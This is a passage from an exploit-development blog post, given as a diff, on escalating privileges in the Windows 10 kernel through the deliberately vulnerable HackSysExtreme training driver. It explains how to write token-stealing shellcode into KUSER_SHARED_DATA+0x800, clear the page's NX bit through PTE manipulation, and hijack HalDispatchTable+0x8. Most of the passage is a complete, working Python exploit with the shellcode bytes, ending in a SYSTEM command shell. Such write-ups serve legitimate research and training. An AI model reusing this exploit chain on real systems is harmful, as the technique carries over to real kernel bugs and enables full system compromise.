@@ -704,5 +704,644 @@ Let's say that for some reason, you are against the method of allocating user mo
 
 Let's say you want to take advantage of various defensive tools and their lack of visibility into kernel mode. How can we leverage already existing kernel mode memory in the same manner?
 
-Okay, This Time We Are Going To The Mountain!
+Okay, This Time We Are Going To The Mountain! `KUSER_SHARED_DATA` Time!
 ---
+
+Morten in his research [suggests](https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf) that another suitable method may be to utilize the [KUSER_SHARED_DATA]() structure in the kernel directly, similarily to who ROP works in user mode.
+
+The concept of ROP in user mode is the idea that we have the ability to write shellcode to the stack, we just don't have the ability to execute it. Using ROP, we can change the permissions of the stack to that of executable, and execute our shellcode from there.
+
+The concept here is no different. We can write our shellcode to `KUSER_SHARED_DATA+0x800`, because it is a kernel mode page with writeable permissions.
+
+Using our write and read primtives, we can then flip the NX bit (similar to ROP in user mode) and make the kernel mode memory executable!
+
+The questions still remains, why `KUSER_SHARED_DATA`?
+
+Static Electricity
+---
+
+Windows has slowly but surely dried up all of the static addresses used by exploit developers over the years. One of the last structures that many people used for kASLR bypasses, was the randomization of the HAL heap. The HAL heap used to contain a pointer to the kernel, but no longer does.
+
+Although everything is dynamically based, there is still a structure that remains which is static, `KUSER_SHARED_DATA`.
+
+This structure, [according to](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kuser_shared_data/index.htm) Geoff Chappell, is used to define the layout of data that the kernel shares with user mode.
+
+The issue is, this structure is static at the address `0xFFFFF78000000000`!
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_16.png" alt="">
+
+What is even more interesting, is that `KUSER_SHARED_DATA+0x800` seems to just be a code cave of non-executable kernel mode memory which is writeable!
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_17.png" alt="">
+
+How Do We Leverage This?
+---
+
+Our arbitrary write primitive only allows us to write one QWORD of data at a time (8 bytes). My thought process here is to:
+
+1. Break up the 67 byte shellcode into 8 byte pieces and compensate any odd numbering with NULL bytes.
+2. Write each line of shellcode to `KUSER_SHARED_DATA+0x800`, `KUSER_SHARED_DATA+0x808`,`KUSER_SHARED_DATA+0x810`, etc.
+3. Use the same read primitive to bypass page table randomization and obtain PTE control bits of `KUSER_SHARED_DATA+0x800`.
+4. Make `KUSER_SHARED_DATA+0x800` executable.
+5. `NT AUTHORITY\SYSTEM`
+
+Before we begin, the steps about obtaining the contents of `nt!MiGetPteAddress+0x13` and extracting the PTE control bits will be left out in this portion of the blog, as they have already been explained!
+
+Moving on, let's start with each line of shellcode.
+
+For each line written the data type chosen was that of a [c_ulonglong()](https://docs.python.org/2/library/ctypes.html#ctypes.c_ulonglong)- as it was easy to store into a `c_void_p`.
+
+The first line of shellcode had an associated structure as shown below.
+
+```python
+class WriteWhatWhere_Shellcode_1(Structure):
+    _fields_ = [
+        ("What_Shellcode_1", c_void_p),
+        ("Where_Shellcode_1", c_void_p)
+    ]
+```
+
+Shellcode is declared as a `c_ulonglong()`.
+
+```python
+# Using just long long integer, because only writing opcodes.
+first_shellcode = c_ulonglong(0x00018825048B4865)
+```
+
+The shellcode is then written to `KUSER_SHARED_DATA+0x800` through the previously created structure.
+
+```python
+www_shellcode_one = WriteWhatWhere_Shellcode_1()
+www_shellcode_one.What_Shellcode_1 = addressof(first_shellcode)
+www_shellcode_one.Where_Shellcode_1 = KUSER_SHARED_DATA + 0x800
+www_shellcode_one_pointer = pointer(www_shellcode_one)
+```
+
+This same process was repeated 9 times, until all of the shellcode was written.
+
+As you can see in the image below, the shellcode was successfully written to `KUSER_SHARED_DATA+0x800` due to the writeable PTE control bit of this structure.
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_19.png" alt="">
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_18.png" alt="">
+
+Executable, Please!
+---
+
+Using the same arbitrary read primitives as earlier, we can extract the PTE control bits of `KUSER_SHARED_DATA+0x800`'s memory page. This time, however, instead of subtracting 4- we are going to use bitwise AND per Morten's research.
+
+```python
+# Setting KUSER_SHARED_DATA + 0x800 to executable
+pte_control_bits_execute= pte_control_bits_no_execute & 0x0FFFFFFFFFFFFFFF
+```
+
+We can see that dynamically, we can set `KUSER_SHARED_DATA+0x800` to executable memory, giving us a nice big executable kernel memory region!
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_20.png" alt="">
+
+All that is left to do now, is overwrite the `nt!HalDispatchTable+0x8` with the address of `KUSER_SHARED_DATA+0x800` and `nt!KeQueryIntervalProfile()` will take care of the rest!
+
+This exploit can also be found on my GitHub, but here it is if you do not feel like heading over there:
+
+```python
+# HackSysExtreme Vulnerable Driver Kernel Exploit (x64 Arbitrary Overwrite/SMEP Enabled)
+# KUSER_SHARED_DATA + 0x800 overwrite
+# Windows 10 RS1
+# Author: Connor McGarr
+
+import struct
+import sys
+import os
+from ctypes import *
+
+kernel32 = windll.kernel32
+ntdll = windll.ntdll
+psapi = windll.Psapi
+
+# Defining KUSER_SHARED_DATA
+KUSER_SHARED_DATA = 0xFFFFF78000000000
+
+# First structure, for obtaining nt!MiGetPteAddress+0x13 value
+class WriteWhatWhere_PTE_Base(Structure):
+    _fields_ = [
+        ("What_PTE_Base", c_void_p),
+        ("Where_PTE_Base", c_void_p)
+    ]
+
+# Second structure, first 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
+class WriteWhatWhere_Shellcode_1(Structure):
+    _fields_ = [
+        ("What_Shellcode_1", c_void_p),
+        ("Where_Shellcode_1", c_void_p)
+    ]
+
+# Third structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
+class WriteWhatWhere_Shellcode_2(Structure):
+    _fields_ = [
+        ("What_Shellcode_2", c_void_p),
+        ("Where_Shellcode_2", c_void_p)
+    ]
+
+# Fourth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
+class WriteWhatWhere_Shellcode_3(Structure):
+    _fields_ = [
+        ("What_Shellcode_3", c_void_p),
+        ("Where_Shellcode_3", c_void_p)
+    ]
+
+# Fifth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
+class WriteWhatWhere_Shellcode_4(Structure):
+    _fields_ = [
+        ("What_Shellcode_4", c_void_p),
+        ("Where_Shellcode_4", c_void_p)
+    ]
+
+# Sixth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
+class WriteWhatWhere_Shellcode_5(Structure):
+    _fields_ = [
+        ("What_Shellcode_5", c_void_p),
+        ("Where_Shellcode_5", c_void_p)
+    ]
+
+# Seventh structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
+class WriteWhatWhere_Shellcode_6(Structure):
+    _fields_ = [
+        ("What_Shellcode_6", c_void_p),
+        ("Where_Shellcode_6", c_void_p)
+    ]
+
+# Eighth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
+class WriteWhatWhere_Shellcode_7(Structure):
+    _fields_ = [
+        ("What_Shellcode_7", c_void_p),
+        ("Where_Shellcode_7", c_void_p)
+    ]
+
+# Ninth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
+class WriteWhatWhere_Shellcode_8(Structure):
+    _fields_ = [
+        ("What_Shellcode_8", c_void_p),
+        ("Where_Shellcode_8", c_void_p)
+    ]
+
+# Tenth structure, last 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
+class WriteWhatWhere_Shellcode_9(Structure):
+    _fields_ = [
+        ("What_Shellcode_9", c_void_p),
+        ("Where_Shellcode_9", c_void_p)
+    ]
+
+
+# Eleventh structure, for obtaining the control bits for the PTE
+class WriteWhatWhere_PTE_Control_Bits(Structure):
+    _fields_ = [
+        ("What_PTE_Control_Bits", c_void_p),
+        ("Where_PTE_Control_Bits", c_void_p)
+    ]
+
+# Twelfth structure, to overwrite executable bit of KUSER_SHARED_DATA+0x800's PTE
+class WriteWhatWhere_PTE_Overwrite(Structure):
+    _fields_ = [
+        ("What_PTE_Overwrite", c_void_p),
+        ("Where_PTE_Overwrite", c_void_p)
+    ]
+
+# Thirteenth structure, to overwrite HalDispatchTable + 0x8 with KUSER_SHARED_DATA + 0x800
+class WriteWhatWhere(Structure):
+    _fields_ = [
+        ("What", c_void_p),
+        ("Where", c_void_p)
+    ]
+
+"""
+Token stealing payload
+
+\x65\x48\x8B\x04\x25\x88\x01\x00\x00              # mov rax,[gs:0x188]  ; Current thread (KTHREAD)
+\x48\x8B\x80\xB8\x00\x00\x00                      # mov rax,[rax+0xb8]  ; Current process (EPROCESS)
+\x48\x89\xC3                                      # mov rbx,rax         ; Copy current process to rbx
+\x48\x8B\x9B\xF0\x02\x00\x00                      # mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
+\x48\x81\xEB\xF0\x02\x00\x00                      # sub rbx,0x2f0       ; Go back to current process
+\x48\x8B\x8B\xE8\x02\x00\x00                      # mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
+\x48\x83\xF9\x04                                  # cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
+\x75\xE5                                          # jnz 0x13            ; Loop until SYSTEM PID is found
+\x48\x8B\x8B\x58\x03\x00\x00                      # mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x358
+\x80\xE1\xF0                                      # and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
+\x48\x89\x88\x58\x03\x00\x00                      # mov [rax+0x358],rcx ; Copy SYSTEM token to current process
+\x48\x31\xC0                                      # xor rax,rax         ; set NTSTATUS SUCCESS
+\xC3                                              # ret                 ; Done!
+)
+"""
+
+# c_ulonglong because of x64 size (unsigned __int64)
+base = (c_ulonglong * 1024)()
+
+print "[+] Calling EnumDeviceDrivers()..."
+get_drivers = psapi.EnumDeviceDrivers(
+    byref(base),                      # lpImageBase (array that receives list of addresses)
+    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
+    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
+)
+
+# Error handling if function fails
+if not base:
+    print "[+] EnumDeviceDrivers() function call failed!"
+    sys.exit(-1)
+
+# The first entry in the array with device drivers is ntoskrnl base address
+kernel_address = base[0]
+
+# Print update for ntoskrnl.exe base address
+print "[+] Found kernel leak!"
+print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))
+
+# Phase 1: Grab the base of the PTEs via nt!MiGetPteAddress
+
+# Retrieving nt!MiGetPteAddress (Windows 10 RS1 offset)
+nt_mi_get_pte_address = kernel_address + 0x1b5f4
+
+# Print update for nt!MiGetPteAddress address 
+print "[+] nt!MiGetPteAddress is located at: {0}".format(hex(nt_mi_get_pte_address))
+
+# Base of PTEs is located at nt!MiGetPteAddress + 0x13
+pte_base = nt_mi_get_pte_address + 0x13
+
+# Print update for nt!MiGetPteAddress+0x13 address
+print "[+] nt!MiGetPteAddress+0x13 is located at: {0}".format(hex(pte_base))
+
+# Creating a pointer in which the contents of nt!MiGetPteAddress+0x13 will be stored in to
+# Base of the PTEs are stored here
+base_of_ptes_pointer = c_void_p()
+
+# Write-what-where structure #1
+www_pte_base = WriteWhatWhere_PTE_Base()
+www_pte_base.What_PTE_Base = pte_base
+www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
+www_pte_pointer = pointer(www_pte_base)
+
+# Getting handle to driver to return to DeviceIoControl() function
+handle = kernel32.CreateFileA(
+    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
+    0xC0000000,                         # dwDesiredAccess
+    0,                                  # dwShareMode
+    None,                               # lpSecurityAttributes
+    0x3,                                # dwCreationDisposition
+    0,                                  # dwFlagsAndAttributes
+    None                                # hTemplateFile
+)
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_pte_pointer,                       # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# CTypes way of extracting value from a C void pointer
+base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]
+
+# Print update for PTE base
+print "[+] Leaked base of PTEs!"
+print "[+] Base of PTEs are located at: {0}".format(hex(base_of_ptes))
+
+# Phase 2: Calculate KUSER_SHARED_DATA's PTE address
+
+# Calculating the PTE for KUSER_SHARED_DATA + 0x800
+kuser_shared_data_800_pte_address = KUSER_SHARED_DATA + 0x800 >> 9
+kuser_shared_data_800_pte_address &= 0x7ffffffff8
+kuser_shared_data_800_pte_address += base_of_ptes
+
+# Print update for KUSER_SHARED_DATA + 0x800 PTE
+print "[+] PTE for KUSER_SHARED_DATA + 0x800 is located at {0}".format(hex(kuser_shared_data_800_pte_address))
+
+# Phase 3: Write shellcode to KUSER_SHARED_DATA + 0x800
+
+# First 8 bytes
+
+# Using just long long integer, because only writing opcodes.
+first_shellcode = c_ulonglong(0x00018825048B4865)
+
+# Write-what-where structure #2
+www_shellcode_one = WriteWhatWhere_Shellcode_1()
+www_shellcode_one.What_Shellcode_1 = addressof(first_shellcode)
+www_shellcode_one.Where_Shellcode_1 = KUSER_SHARED_DATA + 0x800
+www_shellcode_one_pointer = pointer(www_shellcode_one)
+
+# Print update for shellcode
+print "[+] Writing first 8 bytes of shellcode to KUSER_SHARED_DATA + 0x800..."
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_shellcode_one_pointer,          # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Next 8 bytes
+second_shellcode = c_ulonglong(0x000000B8808B4800)
+
+# Write-what-where structure #3
+www_shellcode_two = WriteWhatWhere_Shellcode_2()
+www_shellcode_two.What_Shellcode_2 = addressof(second_shellcode)
+www_shellcode_two.Where_Shellcode_2 = KUSER_SHARED_DATA + 0x808
+www_shellcode_two_pointer = pointer(www_shellcode_two)
+
+# Print update for shellcode
+print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x808..."
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_shellcode_two_pointer,          # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Next 8 bytes
+third_shellcode = c_ulonglong(0x02F09B8B48C38948)
+
+# Write-what-where structure #4
+www_shellcode_three = WriteWhatWhere_Shellcode_3()
+www_shellcode_three.What_Shellcode_3 = addressof(third_shellcode)
+www_shellcode_three.Where_Shellcode_3 = KUSER_SHARED_DATA + 0x810
+www_shellcode_three_pointer = pointer(www_shellcode_three)
+
+# Print update for shellcode
+print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x810..."
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_shellcode_three_pointer,        # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Next 8 bytes
+fourth_shellcode = c_ulonglong(0x0002F0EB81480000)
+
+# Write-what-where structure #5
+www_shellcode_four = WriteWhatWhere_Shellcode_4()
+www_shellcode_four.What_Shellcode_4 = addressof(fourth_shellcode)
+www_shellcode_four.Where_Shellcode_4 = KUSER_SHARED_DATA + 0x818
+www_shellcode_four_pointer = pointer(www_shellcode_four)
+
+# Print update for shellcode
+print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x818..."
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_shellcode_four_pointer,         # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Next 8 bytes
+fifth_shellcode = c_ulonglong(0x000002E88B8B4800)
+
+# Write-what-where structure #6
+www_shellcode_five = WriteWhatWhere_Shellcode_5()
+www_shellcode_five.What_Shellcode_5 = addressof(fifth_shellcode)
+www_shellcode_five.Where_Shellcode_5 = KUSER_SHARED_DATA + 0x820
+www_shellcode_five_pointer = pointer(www_shellcode_five)
+
+# Print update for shellcode
+print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x820..."
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_shellcode_five_pointer,         # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Next 8 bytes
+sixth_shellcode = c_ulonglong(0x8B48E57504F98348)
+
+# Write-what-where structure #7
+www_shellcode_six = WriteWhatWhere_Shellcode_6()
+www_shellcode_six.What_Shellcode_6 = addressof(sixth_shellcode)
+www_shellcode_six.Where_Shellcode_6 = KUSER_SHARED_DATA + 0x828
+www_shellcode_six_pointer = pointer(www_shellcode_six)
+
+# Print update for shellcode
+print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x828..."
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_shellcode_six_pointer,          # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Next 8 bytes
+seventh_shellcode = c_ulonglong(0xF0E180000003588B)
+
+# Write-what-where structure #8
+www_shellcode_seven = WriteWhatWhere_Shellcode_7()
+www_shellcode_seven.What_Shellcode_7 = addressof(seventh_shellcode)
+www_shellcode_seven.Where_Shellcode_7 = KUSER_SHARED_DATA + 0x830
+www_shellcode_seven_pointer = pointer(www_shellcode_seven)
+
+# Print update for shellcode
+print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x830..."
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_shellcode_seven_pointer,        # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Next 8 bytes
+eighth_shellcode = c_ulonglong(0x4800000358888948)
+
+# Write-what-where structure #9
+www_shellcode_eight = WriteWhatWhere_Shellcode_8()
+www_shellcode_eight.What_Shellcode_8 = addressof(eighth_shellcode)
+www_shellcode_eight.Where_Shellcode_8 = KUSER_SHARED_DATA + 0x838
+www_shellcode_eight_pointer = pointer(www_shellcode_eight)
+
+# Print update for shellcode
+print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x838..."
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_shellcode_eight_pointer,        # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Last 8 bytes
+ninth_shellcode = c_ulonglong(0x0000000000C3C031)
+
+# Write-what-where structure #10
+www_shellcode_nine = WriteWhatWhere_Shellcode_9()
+www_shellcode_nine.What_Shellcode_9 = addressof(ninth_shellcode)
+www_shellcode_nine.Where_Shellcode_9 = KUSER_SHARED_DATA + 0x840
+www_shellcode_nine_pointer = pointer(www_shellcode_nine)
+
+# Print update for shellcode
+print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x840..."
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_shellcode_nine_pointer,         # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Phase 3: Extract KUSER_SHARED_DATA + 0x800's PTE control bits
+
+# Declaring C void pointer to stores PTE control bits
+pte_bits_pointer = c_void_p()
+
+# Write-what-where structure #11
+www_pte_bits = WriteWhatWhere_PTE_Control_Bits()
+www_pte_bits.What_PTE_Control_Bits = kuser_shared_data_800_pte_address
+www_pte_bits.Where_PTE_Control_Bits = addressof(pte_bits_pointer)
+www_pte_bits_pointer = pointer(www_pte_bits)
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_pte_bits_pointer,               # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# CTypes way of extracting value from a C void pointer
+pte_control_bits_no_execute = struct.unpack('<Q', pte_bits_pointer)[0]
+
+# Print update for PTE control bits
+print "[+] PTE control bits for KUSER_SHARED_DATA + 0x800: {:016x}".format(pte_control_bits_no_execute)
+
+# Phase 4: Overwrite current PTE U/S bit for shellcode page with an S (supervisor/kernel)
+
+# Setting KUSER_SHARED_DATA + 0x800 to executable
+pte_control_bits_execute= pte_control_bits_no_execute & 0x0FFFFFFFFFFFFFFF
+
+# Need to store the PTE control bits as a pointer
+# Using addressof(pte_overwrite_pointer) in Write-what-where structure #4 since a pointer to the PTE control bits are needed
+pte_overwrite_pointer = c_void_p(pte_control_bits_execute)
+
+# Write-what-where structure #12
+www_pte_overwrite = WriteWhatWhere_PTE_Overwrite()
+www_pte_overwrite.What_PTE_Overwrite = addressof(pte_overwrite_pointer)
+www_pte_overwrite.Where_PTE_Overwrite = kuser_shared_data_800_pte_address
+www_pte_overwrite_pointer = pointer(www_pte_overwrite)
+
+# Print update for PTE overwrite
+print "[+] Overwriting KUSER_SHARED_DATA + 0x800's PTE..."
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_pte_overwrite_pointer,          # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Print update for PTE overwrite round 2
+print "[+] KUSER_SHARED_DATA + 0x800 is now executable! See you later, SMEP!"
+
+# Phase 5: Shellcode
+
+# nt!HalDispatchTable address (Windows 10 RS1 offset)
+haldispatchtable_base_address = kernel_address + 0x2f43b0
+
+# nt!HalDispatchTable + 0x8 address
+haldispatchtable = haldispatchtable_base_address + 0x8
+
+# Print update for nt!HalDispatchTable + 0x8
+print "[+] nt!HalDispatchTable + 0x8 is located at: {0}".format(hex(haldispatchtable))
+
+# Declaring KUSER_SHARED_DATA + 0x800 address again as a c_ulonglong to satisy c_void_p type from strucutre.
+KUSER_SHARED_DATA_LONGLONG = c_ulonglong(0xFFFFF78000000800)
+
+# Write-what-where structure #13
+www = WriteWhatWhere()
+www.What = addressof(KUSER_SHARED_DATA_LONGLONG)
+www.Where = haldispatchtable
+www_pointer = pointer(www)
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+print "[+] Interacting with the driver..."
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_pointer,                        # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+
+# Actually calling NtQueryIntervalProfile function, which will call HalDispatchTable + 0x8, where the shellcode will be waiting.
+ntdll.NtQueryIntervalProfile(
+    0x1234,
+    byref(c_ulonglong())
+)
+
+# Print update for shell
+print "[+] Enjoy the NT AUTHORITY\SYSTEM shell!"
+os.system("cmd.exe /K cd C:\\")
+```
+
+
